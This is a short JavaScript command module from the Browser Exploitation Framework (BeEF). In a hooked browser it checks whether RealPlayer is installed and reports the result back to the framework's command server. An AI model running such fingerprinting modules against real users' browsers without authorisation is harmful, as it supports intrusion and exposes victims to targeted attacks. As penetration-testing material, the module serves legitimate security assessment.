//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var result = ( beef.browser.hasRealPlayer() )? "Yes" : "No";

	beef.net.send("<%= @command_url %>", <%= @command_id %>, "realplayer="+result);

});

